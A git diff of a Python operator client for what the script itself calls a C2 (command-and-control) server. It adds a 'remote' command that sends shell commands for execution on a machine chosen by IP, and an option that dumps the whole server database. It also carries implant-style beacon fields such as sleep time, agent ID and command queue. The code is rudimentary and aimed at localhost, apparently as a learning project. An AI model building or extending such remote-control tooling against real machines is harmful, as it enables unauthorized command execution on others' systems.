@@ -3,59 +3,84 @@ import requests
 OGurl = "http://127.0.0.1:5000/"
 Gtest = "https://httpbin.org/get"
 Ptest = "https://httpbin.org/post"
-sql = "http://127.0.0.1:5000/sqlcheck"
-add = "http://127.0.0.1:5000/checkIn"
+sql = "sqlcheck"
+add = "checkIn"
 headers = {"User-Agent": "IWasBornInTheUSA"}
-payload = {"authorize_code": "nuts",
-           "agentId": "know",
-           "IP": "127.0.0.14",
+# payload = {"authorize_code": "nuts",
+#            "agentId": "know",
+#            "IP": "127.0.0.14",
+#            "sleepTime": 33,
+#            "guido": "GUID goes here",
+#            "computerName": "StinkyMac",
+#            "DHkey": "Not Sure Yet",
+#            "cmdQ" : "[]"}
+
+payload = {
            "sleepTime": 33,
            "guido": "GUID goes here",
            "computerName": "StinkyMac",
            "DHkey": "Not Sure Yet"}
 
 
-def get(url=sql, headers=headers):
-    r = requests.get(url, headers=headers)
+def get(url="", headers=headers):
+    r = requests.get((OGurl+url), headers=headers)
     print(r)
     print(r.text)
 
 
-def post(url=add, deets=payload, headers=headers):
-    r = requests.post(url, json=deets, headers=headers)
+def post(url="", deets=payload, headers=headers):
+    r = requests.post(OGurl+ url, json=deets, headers=headers)
     print(r)
     print(r.text)
 
-
+def remote(IP, cmds):
+    print("passed")
+    print(cmds)
+    post("remote", {"IP":IP,"cmds":cmds})
+    
+    
 instructions = "\n\
 Welcome to the client for the C2 server.\n\
 Use the following commands to get started:\n\
-only - post to database\n\
-request {url}- run request test"
+help - displays this message\n\
+sql - print out entire SQL database\n\
+request {url}- run request to url\n\
+remote {cmds} {ip}- execute cmds in machine with certain ip"
 
 
 def mainLoop():
     running = True
     while(running):
         try:
-            cmd = input("Type Cmd here:")
-            if cmd == "help":
-                print(instructions)
-            elif (cmd == "exit"):
-                print("See ya")
-                running = False
-            elif (cmd == "sql"):
-                get(sql)
-            elif (cmd == "add"):
-                post(add)
-            elif (cmd == "home"):
-                post(OGurl)
-            elif (cmd == "ptest"):
-                post(Ptest)
-            elif (cmd == "gtest"):
-                get(Gtest)
-            else:
-                print("Error, I'm not really sure what you meant")
+            cmd=input("Type Cmd here:").split()
+            #activate py10
+            match cmd:
+                case ["help"]:
+                    print(instructions)
+                case ["exit"]:
+                    print("See ya")
+                    running = False
+                case ["sql"]:
+                    get(sql)
+                case ["add"]:
+                    post(add)
+                case ["home"]:
+                    post(OGurl)
+                case ["ptest"]:
+                    post(Ptest)
+                case ["ptest", url]:
+                    get(url)
+                case ["gtest"]:
+                    get(Gtest)
+                case ["gtest", url]:
+                    get(url)
+                case ["remote", IP]:
+                    print("Not enough arguments (Did you forget the IP or cmds?)")
+                case ["remote", IP, *commands]:
+                    remote(IP, [*commands])
+                case _:
+                    print(
+                        f"Error, I'm not really sure what you meant when you said:\n {cmd}")
         except Exception as e:
             print(e)
 
@@ -63,17 +88,3 @@ def mainLoop():
 if __name__ == '__main__':
     print(instructions)
     mainLoop()
-
-
-# To implement later:
-
-# command = input()
-# match command.split():
-#     case["quit"]:
-#         quit()
-#     case["load", filename]:
-#         load_from(filename)
-#     case["save", filename]:
-#         save_to(filename)
-#     case _:
-#         print(f"Command '{command}' not understood")
